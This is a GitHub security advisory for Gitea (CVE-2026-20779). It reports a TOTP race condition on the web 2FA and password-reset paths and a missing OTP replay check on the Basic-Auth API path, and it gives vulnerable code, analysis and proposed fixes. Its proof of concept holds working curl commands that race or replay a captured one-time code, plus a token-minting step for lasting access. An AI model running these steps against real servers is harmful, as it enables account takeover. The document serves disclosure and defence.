# [H] Gitea: TOTP TOCTOU race on web 2FA paths + missing replay check on Basic-Auth `X-Gitea-OTP` surface

## Summary
Severity: High
Advisory: GHSA-gx3v-q759-g323
CVE: CVE-2026-20779
CWE: CWE-294
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:L/A:N (CVSS_V3)
Published: 2026-07-21
Source: https://github.com/advisories/GHSA-gx3v-q759-g323
Type: github-advisory

## Affected
- Go: `code.gitea.io/gitea` — affected >=1.5.0 <1.26.3

## Details
### Summary

I'm reporting **two related TOTP one-time-use defects** in Gitea that survive the CVE-2021-45331 fix. The 2018 fix (PR #3878) introduced the `TwoFactor.LastUsedPasscode` field and added an in-memory inequality check on the web 2FA login path. That check works correctly in the single-request case, but it leaves two follow-up gaps:

1. **A TOCTOU race on the web surfaces (Defect 1).** The read-validate-check-save sequence against the `two_factor` row is not atomic. Two parallel submissions of the same passcode each load their own in-memory copy where `LastUsedPasscode` still holds the prior value; both pass the inequality check, both authenticate, and both then write the same new value back. Net effect: the same OTP redeems for two independent logged-in sessions.

2. **No `LastUsedPasscode` check at all on the Basic-Auth API surface (Defect 2).** `services/auth/basic.go` calls `twofa.ValidateTOTP(...)` for `X-Gitea-OTP` without ever reading or writing `LastUsedPasscode`. The same six-digit code is replayable for the full `totp.Validate` acceptance window (~60–90 s with the default `Skew=1`). This is a clean [RFC 6238 §5.2](https://datatracker.ietf.org/doc/html/rfc6238#section-5.2) violation independent of timing, shaped identically to the pre-CVE-2021-45331 behaviour but scoped to the API / Git-over-HTTPS basic-auth path instead of the web form.

Both defects post-date the 2018 fix; neither is referenced in any published Gitea advisory I could find. I'm filing this as a **follow-up** to CVE-2021-45331, not a duplicate.

### Vulnerable code

#### Defect 1 — TOCTOU race on web 2FA login

`routers/web/auth/2fa.go:55-88`:

```go
54  id := idSess.(int64)
55  twofa, err := auth.GetTwoFactorByUID(ctx, id)             // (A) read row
56  ...
62  ok, err := twofa.ValidateTOTP(form.Passcode)              // (B) pure-function RFC 6238 check
...
68  if ok && twofa.LastUsedPasscode != form.Passcode {        // (C) check against in-memory copy
...
84      twofa.LastUsedPasscode = form.Passcode                 // (D) mutate in-memory
85      if err = auth.UpdateTwoFactor(ctx, twofa); err != nil {// (E) UPDATE … AllCols where id=?
```

Step (E) is plain `db.GetEngine(ctx).ID(t.ID).AllCols().Update(t)` (`models/auth/twofactor.go:128-131`) — no row lock, no `WHERE last_used_passcode = <previous>` predicate, and no DB uniqueness on `(uid, last_used_passcode)`. The model definition at `models/auth/twofactor.go:48-57` shows `LastUsedPasscode string` is a plain column — no constraint, no version field.

#### Defect 1 — same shape, password-reset 2FA re-auth

`routers/web/auth/password.go:179-196` shows the identical pattern in the password-reset flow:

```go
179  passcode := ctx.FormString("passcode")
180  ok, err := twofa.ValidateTOTP(passcode)
...
185  if !ok || twofa.LastUsedPasscode == passcode {           // same check-against-in-memory pattern
...
192  twofa.LastUsedPasscode = passcode
193  if err = auth.UpdateTwoFactor(ctx, twofa); err != nil {
```

Same shape, same race window.

#### Defect 2 — Basic-Auth API / Git-over-HTTPS (stateless replay — no check at all)

`services/auth/basic.go:170-185`:

```go
func validateTOTP(req *http.Request, u *user_model.User) error {
    twofa, err := auth_model.GetTwoFactorByUID(req.Context(), u.ID)
    ...
    if ok, err := twofa.ValidateTOTP(req.Header.Get("X-Gitea-OTP")); err != nil {  // :179
        return err
    } else if !ok {
        return util.NewInvalidArgumentErrorf("invalid provided OTP")
    }
    return nil
}
```

`LastUsedPasscode` is neither read nor written on this path. The same six-digit code in `X-Gitea-OTP` succeeds for the full `totp.Validate` acceptance window on every request.

#### Why the existing failed-login counter doesn't catch either defect

Gitea's `loginAttempts` counter increments on **failed** sign-ins. A successful replay is a success — the counter is never touched, and two parallel successes produce two access tokens with no anomaly logged at the auth layer.

### Race-window analysis (Defect 1)

Inside `TwoFactorPost`, the critical region between (A) `GetTwoFactorByUID` and (E) `UpdateTwoFactor` covers:

1. one DB SELECT round-trip,
2. base64-decode + AES-decrypt of the secret (`models/auth/twofactor.go:108-118`),
3. `totp.Validate` (HMAC-SHA1 over the secret + time-step),
4. `user_model.GetUserByID` (a second SELECT),
5. optional `linkAccountFromContext` / OpenID link branch,
6. the assignment + UPDATE.

On a non-CPU-bound deployment this window is a few milliseconds on the fast path, tens of ms when `linkAccount` / OpenID branches are taken. An attacker who already holds both factors and can submit two `POST /user/two_factor` requests in parallel (HTTP/2 multiplexing, or two backgrounded curls) hits the race reliably — both goroutines enter step (C) with the same stale `LastUsedPasscode`, both reach step (D), both write the new value back. The two responses each set the user's session and `KeyUserHasTwoFactorAuth = true`.

The same window exists on the password-reset flow (`routers/web/auth/password.go:179-193`).

Defect 2 (basic-auth) is a different shape: no race needed. Every request that supplies the correct passcode within `totp.Validate`'s skew window succeeds, indefinitely, until the time-step rolls.

### Reachable HTTP routes

| Surface | Route | Defect |
|---------|-------|--------|
| Web 2FA login | `POST /user/two_factor` (`TwoFactorPost`) | 1 — TOCTOU race |
| Password-reset 2FA re-auth | `POST /user/password/reset` (`ResetPasswdPost`) when `twofa` is set | 1 — TOCTOU race |
| Basic-Auth API | every API endpoint that accepts Basic auth with `X-Gitea-OTP` header (e.g. `/api/v1/user`, `/api/v1/users/{username}/tokens`) | 2 — stateless replay |
| Git-over-HTTPS push/pull | Basic-auth flow, same `X-Gitea-OTP` route into `services/auth/basic.go:validateTOTP` | 2 — stateless replay |

### Proof of concept

Pre-conditions: attacker has the victim's password (credential dump, phish, separate vuln) and one live TOTP value within the RFC 6238 window (AiTM relay such as Evilginx2, malicious browser extension, infostealer log, shoulder-surf). Network reach to the Gitea HTTP listener.

#### Defect 1 — Web 2FA race (parallel curl)

```bash
# Step 1 — start a 2FA-pending session (password phase).
curl -c jar.txt -b jar.txt -d 'user_name=alice&password=<known>' \
     https://gitea.example.com/user/login

# Step 2 — fire two identical POSTs to /user/two_factor with the captured passcode.
PASS=654321
( curl -sS -c jar1.txt -b jar.txt -X POST \
       -d "passcode=${PASS}" https://gitea.example.com/user/two_factor & )
( curl -sS -c jar2.txt -b jar.txt -X POST \
       -d "passcode=${PASS}" https://gitea.example.com/user/two_factor & )
wait

# Step 3 — both cookie jars now hold authenticated sessions for Alice.
curl -b jar1.txt https://gitea.example.com/user/settings  # 200
curl -b jar2.txt https://gitea.example.com/user/settings  # 200
```

Repeated trials succeed often enough to be exploitable; a kit firing N=5 parallel attempts hits the race on virtually every iteration. Note that the legitimate browser tab counts as one of the racers — the attacker's request only needs to arrive between the victim's (A) and the victim's (E).

#### Defect 2 — Basic-Auth API replay (no race needed)

```bash
# Attacker captured Alice's password + one live OTP (654321).
# Within the RFC 6238 window (~60–90 s):
curl -u "alice:<known-password>" \
     -H "X-Gitea-OTP: 654321" \
     https://gitea.example.com/api/v1/user
# → 200 OK. Repeat as many times as the time-step allows.
```

Each call succeeds. An attacker can mint a personal access token via `POST /api/v1/users/{username}/tokens` inside that window for long-lived access that outlives the captured OTP.

### Impact

- **Defect 1 (Web TOCTOU).** Narrow exploit window but completely deterministic on parallel submission. The victim's own legitimate login is itself the trigger — no second observation of the OTP is needed if the attacker can race the victim's submission. Net effect: two authenticated sessions for one OTP, defeating RFC 6238 §5.2 in the multi-session case.
- **Defect 2 (Basic-Auth stateless replay).** The more serious of the two. Any captured OTP value remains valid on the API / git-clone basic-auth surface for the full `totp.Validate` window. An attacker who AiTM-relays one login can carve out 60–90 s of unattended API access during which they can mint a personal access token and persist past the OTP window. This surface specifically attracts attackers because (a) it is non-interactive (a script can hammer it), and (b) PAT minting via `/api/v1/users/{username}/tokens` does not require a second 2FA prompt once basic-auth + OTP have succeeded.
- **Successful-replay invisibility.** Gitea's failed-login counter increments on `FailedLoginException`; a successful replay never throws. The audit log records two successful 2FA authentications for the same principal at near-identical timestamps — most SIEM rules will not flag this.

### Conditions for exploit

| Required | Detail |
|----------|--------|
| Network reach to Gitea HTTP listener | Trivially available |
| Valid victim password | Credential dump / phishing relay / separate vuln |
| One captured OTP value within ~90 s | AiTM, infostealer log, shoulder-surf, MITM, malicious extension |
| Ability to fire two parallel HTTP requests | Trivial (`curl -P 2`, `xargs -P 2`, HTTP/2 multiplexing) — Defect 1 only |

No special role / permission required on Gitea. Both defects are exploitable from any unauthenticated network position that can reach the listener.

### Suggested remediation

Two distinct fixes are needed; option (c) collapses both into one place and is the recommended path.

**(a) Race fix — compare-and-swap on UPDATE (Defect 1):**

```go
// models/auth/twofactor.go
func UpdateTwoFactorCAS(ctx context.Context, t *TwoFactor, prevPasscode string) (bool, error) {
    n, err := db.GetEngine(ctx).ID(t.ID).
        Where("last_used_passcode = ?", prevPasscode).
        AllCols().Update(t)
    return n == 1, err
}
```

Each handler captures `prev := twofa.LastUsedPasscode` before mutating, calls `UpdateTwoFactorCAS(ctx, twofa, prev)`, and rejects the request if `n != 1`. Fixes both web sites with no extra lock contention. A row-level lock (`SELECT … FOR UPDATE` inside a `db.WithTx`) is an equivalent surgical option. Equivalent atomicity can also be obtained by a unique index on `(twofa_id, last_used_passcode)` so a duplicate UPDATE collides at the DB layer.

**(b) Basic-Auth fix (Defect 2):**

Wrap the `twofa.ValidateTOTP(...)` call at `services/auth/basic.go:179` in the same inequality check + update pattern used in `routers/web/auth/2fa.go:68,84-85`, ideally via the CAS helper above so the basic-auth path can't reintroduce the race either.

**(c) Preferred — store the accepted time-step counter, route every call site through one consume helper:**

Replace `LastUsedPasscode string` with `LastTotpStep int64`. Derive the matching step inside `TwoFactor.ValidateTOTP` (skew-aware) and CAS on the step value:

```go
func (t *TwoFactor) ValidateAndConsumeTOTP(ctx context.Context, passcode string) (bool, error) {
    step, ok, err := validateAndReturnStep(passcode, t.Secret) // skew-aware
    if err != nil || !ok { return false, err }

    n, err := db.GetEngine(ctx).Table("two_factor").
        Where("id = ? AND last_totp_step < ?", t.ID, step).
        Cols("last_totp_step").
        Update(map[string]any{"last_totp_step": step})
    if err != nil || n == 0 { return false, err }   // already consumed — replay refused
    t.LastTotpStep = step
    return true, nil
}
```

All three call sites (`routers/web/auth/2fa.go`, `routers/web/auth/password.go`, `services/auth/basic.go`) then go through this single function and cannot accidentally skip the consume step. Same fix shape as `django-otp` (`last_t`) and Authentik (`authentik/stages/authenticator_totp/models.py:184`). Recommended option because it makes the defect impossible to reintroduce at a future call site.

A schema migration is required for (c); (a)+(b) is the surgical minimum.

### References

- RFC 6238 §5.2 — TOTP one-time use: https://datatracker.ietf.org/doc/html/rfc6238#section-5.2
- CWE-294 — Authentication Bypass by Capture-replay: https://cwe.mitre.org/data/definitions/294.html
- CWE-367 — Time-of-check Time-of-use (TOCTOU) Race Condition: https://cwe.mitre.org/data/definitions/367.html
- Original Gitea fix this report builds on — CVE-2021-45331 / PR #3878 (introduced `LastUsedPasscode`): https://github.com/go-gitea/gitea/pull/3878

## References
- https://github.com/go-gitea/gitea/security/advisories/GHSA-gx3v-q759-g323
- https://nvd.nist.gov/vuln/detail/CVE-2026-20779
- https://github.com/go-gitea/gitea/pull/38151
- https://github.com/go-gitea/gitea/commit/99f8b3d9a1d32f4c39828e07971455a18191e0b9
- https://blog.gitea.com/release-of-1.26.3-and-1.26.4
- https://github.com/go-gitea/gitea
- https://github.com/go-gitea/gitea/releases/tag/v1.26.3
